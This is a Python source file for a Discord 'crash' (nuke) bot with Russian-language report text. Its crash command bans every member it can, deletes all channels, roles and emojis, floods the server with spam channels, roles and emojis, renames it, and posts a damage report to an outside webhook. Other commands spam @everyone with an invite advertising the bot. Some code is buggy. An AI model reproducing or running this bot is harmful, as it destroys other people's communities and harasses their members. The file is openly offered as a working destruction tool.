import discord
import datetime
import random
import asyncio

from discord.ext import commands
from config import settings
from discord import Webhook, RequestsWebhookAdapter

client = commands.Bot(command_prefix = settings['PREFIX'], case_insensitive = True, intents = discord.Intents.all())
client.remove_command('help')

global webhook
webhook = Webhook.from_url(settings['WEBHOOK'], adapter=RequestsWebhookAdapter())


def localtime():
	time = datetime.datetime.now()
	return f'[{time.strftime("%H:%M:%S")}]'

@client.event
async def on_ready():
	await client.change_presence(activity = discord.Game('t!crash | .gg/43GtxcFXPK'))
	print(f'Bot {client.user.name}#{client.user.discriminator} is ready')

@client.command()
async def crash(ctx):
	ctx.send(channel, "huh :)")
	print('='*45)
	start_time = localtime()
	start_guild_num = len(ctx.guild.members)
	start_guild_chan_num = len(ctx.guild.channels)
	start_guild_role_num = len(ctx.guild.roles)
	start_guild_emoji_num = len(ctx.guild.emojis)
	##############################################
	banned_num = 0
	deleted_chan = 0
	deleted_roles = 0
	deleted_emojis = 0
	# BAN MEMBERS
	for member in ctx.guild.members:
		try:
			await member.ban()
			print(f'{localtime()} {member.name} - banned')
			banned_num += 1
		except:
			print(f'{localtime()} {member.name} - can not be banned')
	print('='*15+f' Banned {banned_num} of {start_guild_num} members '+'='*15)
	# DELETE CHANNELS 
	for channel in ctx.guild.channels:
		try:
			await channel.delete()
			print(f'{localtime()} {channel.name} - deleted')
			deleted_chan += 1
		except:
			print(print(f'{localtime()} {channel.name} - can not be deleted'))
	print('='*15+f' Deleted {deleted_chan} of {start_guild_chan_num} channels '+'='*15)
	# DELETE ROLES
	for role in ctx.guild.roles:
		try:
			await role.delete()
			print(f'{localtime()} {role.name} - deleted')
			deleted_roles += 1
		except:
			print(f'{localtime()} {role.name} - can not be deleted')
	print('='*15+f' Deleted {deleted_roles} of {start_guild_role_num} roles '+'='*15)
	# DELETE EMOJIS
	for emoji in ctx.guild.emojis:
		try:
			await emoji.delete()
			print(f'{localtime()} {emoji.name} - deleted')
			deleted_emojis+=1
		except:
			print(f'{localtime()} {emoji.name} - can not be deleted')
	print('='*15+f' Deleted {deleted_emojis} of {start_guild_emoji_num} emojis '+'='*15)
	# SPAM
	text_num = 0
	voice_num = 0
	roles_num = 0
	emojis_num = 0
	servername = ctx.guild.name
	servericon = ctx.guild.icon_url

	for x in range(settings['TEXT-CHANNELS']):
		text_num += 1
		await ctx.guild.create_text_channel(f"{settings['TEXT']}-{text_num}-{random.randint(1, 1000)}")
	print('='*15+f" Created {text_num} of {settings['TEXT-CHANNELS']} text channels "+'='*15)

	for y in range(settings['VOICE-CHANNELS']):
		voice_num += 1
		await ctx.guild.create_voice_channel(f"{settings['TEXT']}-{voice_num}-{random.randint(1, 1000)}")
	print('='*15+f" Created {voice_num} of {settings['VOICE-CHANNELS']} voice channels "+'='*15)

	for z in range(settings['ROLES']):
		roles_num += 1
		await ctx.guild.create_role(name = f"{settings['TEXT']}-{roles_num}-{random.randint(1, 1000)}")
	print('='*15+f" Created {roles_num} of {settings['ROLES']} roles "+'='*15)

	fp = open(settings['ICON-PNG'], 'rb')
	pfp = fp.read()

	for e in range(settings['EMOJI']):
		emojis_num += 1
		await ctx.guild.create_custom_emoji(name = settings['TEXT'], image = pfp)
	print('='*15+f" Created {emojis_num} of {settings['EMOJI']} emojis "+'='*15)

	pfp_ch = False
	try:
		fp = open(settings['ICON-PNG'], 'rb')
		pfp = fp.read()
		await ctx.guild.edit(name = settings['TEXT'], icon = pfp)
		print(f'{localtime()} Icon changed')
		pfp_ch = True
	except:
		await ctx.guild.edit(name = settings['TEXT'])
		print(f'{localtime()} Icon changed')
		pfp_ch = True

	end_time = localtime()

	print('Crash ended.')
	print('Sending webhook crash report.')
	await asyncio.sleep(2)
	#CRASH REPORT
	try:
		emb = discord.Embed(title = 'Новый краш!', description = f"\Сервер: {servername}, иконка: ------->\n\**Участников**: {start_guild_num}\n\
		**Удалено:**\n\
			**Каналов:** {deleted_chan}/{start_guild_chan_num}\n\
			**Людей забанено:** {banned_num}/{start_guild_num}\n\
			**Эмодзи удалено:** {deleted_emojis}/{start_guild_emoji_num}\n\
			**Ролей:** {deleted_roles}/{start_guild_role_num}\n\n\
		**Изменено:**\n\
			**Создано:**\n\
			**Текстовых каналов:** {text_num}/{settings['TEXT-CHANNELS']}\n\
			**Голосовых:** {voice_num}/{settings['VOICE-CHANNELS']}\n\n\
		**Другое**\n\
			**Создано ролей:** {roles_num}/{settings['ROLES']}\n\
			**Эмодзи создано:** {emojis_num}/{settings['EMOJI']}\n\
			**Аватарка изменена(Тrue - да, Fаlse - нет):** {str(pfp_ch)}\n\n\
		**Начало краша:** {start_time}\n\
		**Конец краша:** {end_time}\n\n\Не добавляйте подозрительных ботов и следите за правом управления сервером :)", color = 0xe01337)
		emb.set_thumbnail(url = servericon)
		webhook.send(embed = emb, username = 'Краш-бот')
		print(f'Crash ended. Webhook - succes\n{start_time} - {end_time}')
	except:
		print(f'Crash ended. Wenhook send problem\n{start_time} - {end_time}')

@client.command(aliases=['spam'])
async def __spam(ctx):
  for i in range(150):
    try:
      await ctx.send('@everyone S3rv3r crash9d by new crash bot: Destroyer!\n\Ссылка на сервер: https://discord.gg/43GtxcFXPK')
    except:
       break

@client.command(aliases=['spamall'])
async def __spamall(ctx):
	for channel in ctx.guild.text_channels in range(20):
		try:
			await ctx.send('@everyone S3rv3r crash9d by new crash bot: Destroyer!\n\Ссылка на сервер: https://discord.gg/43GtxcFXPK')
		except:
			break

client.run(settings['TOKEN'])
